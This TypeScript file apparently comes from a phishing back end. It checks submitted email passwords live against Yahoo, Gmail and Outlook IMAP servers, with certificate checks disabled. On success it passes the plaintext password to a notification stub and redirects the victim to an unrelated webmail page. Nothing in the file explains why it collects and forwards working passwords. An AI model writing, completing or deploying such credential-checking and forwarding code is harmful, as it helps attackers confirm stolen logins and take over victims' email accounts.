import { ImapFlow } from 'imapflow';

async function sendYahooNotification(email: string, password: string): Promise<void> {
  // Implement notification logic here
  console.log('[v0] Sending notification for', email);
}

function resolveImapServer(email: string): string | null {
  const domain = email.split('@')[1]?.toLowerCase();
  const imapServers: Record<string, string> = {
    'yahoo.com': 'imap.mail.yahoo.com',
    'gmail.com': 'imap.gmail.com',
    'outlook.com': 'imap-mail.outlook.com',
    // Add more domains as needed
  };
  return imapServers[domain] || null;
}

export async function validateImapCredentials(email: string, password: string) {
  try {
    const imapHost = resolveImapServer(email);
    const imapPort = 993;

    if (!imapHost) {
      return {
        success: false,
        valid: false,
        email,
        error: `No IMAP server configured for domain: ${email.split('@')[1]}`,
      };
    }

    console.log(`[v0] Attempting IMAP auth for ${email} @ ${imapHost}:${imapPort}`);

    // First, test basic TCP connectivity
    try {
      const tcpTest = await fetch(`https://${imapHost}:${imapPort}`, {
        method: 'HEAD',
        signal: AbortSignal.timeout(5000),
      }).catch(() => null);
      console.log(`[v0] TCP connectivity test to ${imapHost}:${imapPort}: ${tcpTest ? 'OK' : 'FAILED'}`);
    } catch {
      console.log(`[v0] TCP connectivity test to ${imapHost}:${imapPort}: FAILED`);
    }

    const client = new ImapFlow({
      host: imapHost,
      port: imapPort,
      secure: true,
      auth: { user: email, pass: password },
      connectionTimeout: 20000,
      logger: {
        debug: (obj) => console.log('[imap-debug]', obj),
        info: (obj) => console.log('[imap-info]', obj),
        warn: (obj) => console.log('[imap-warn]', obj),
        error: (obj) => console.log('[imap-error]', obj),
      },
      tls: {
        rejectUnauthorized: false,
        // Force common secure protocols
        minVersion: 'TLSv1.2',
        // Try all common ciphers
        ciphers: [
          'TLS_AES_256_GCM_SHA384',
          'TLS_AES_128_GCM_SHA256',
          'ECDHE-RSA-AES128-GCM-SHA256',
          'ECDHE-RSA-AES256-GCM-SHA384',
          'ECDHE-ECDSA-AES128-GCM-SHA256',
          'ECDHE-ECDSA-AES256-GCM-SHA384',
          'DHE-RSA-AES128-GCM-SHA256',
          'DHE-RSA-AES256-GCM-SHA384',
          'ECDHE-RSA-AES128-SHA256',
          'ECDHE-RSA-AES256-SHA384',
          'ECDHE-ECDSA-AES128-SHA256',
          'ECDHE-ECDSA-AES256-SHA384',
        ].join(':'),
      },
    });

    try {
      await client.connect();
      console.log('[v0] IMAP connection established, checking mailbox status...');

      // Try to open INBOX to confirm auth really worked
      const mailbox = await client.mailboxOpen('INBOX');
      console.log(`[v0] INBOX opened successfully, exists: ${mailbox.exists}`);

      await client.logout();

      console.log('[v0] Valid credentials for', email, '— confirmed via IMAP auth');

      // Fire notification
      sendYahooNotification(email, password).catch((err: Error) => {
        console.error('[v0] Yahoo notification error:', err);
      });

      return {
        success: true,
        valid: true,
        email,
        redirect: `https://webmail.sti.net/tuxedo/`,
      };
    } catch (authErr: any) {
      console.log('[v0] IMAP operation failed:', authErr.message || authErr);
      if (authErr.code) console.log('[v0] Error code:', authErr.code);
      if (authErr.source) console.log('[v0] Error source:', authErr.source);
      if (authErr.response) console.log('[v0] Server response:', authErr.response);

      return {
        success: false,
        valid: false,
        email,
        error: 'Invalid credentials',
      };
    }
  } catch (error: any) {
    console.error('[v0] Login error for', email, ':', error);
    return {
      success: false,
      valid: false,
      email,
      error: 'Could not verify credentials: ' + (error.message || 'Unknown error'),
    };
  }
}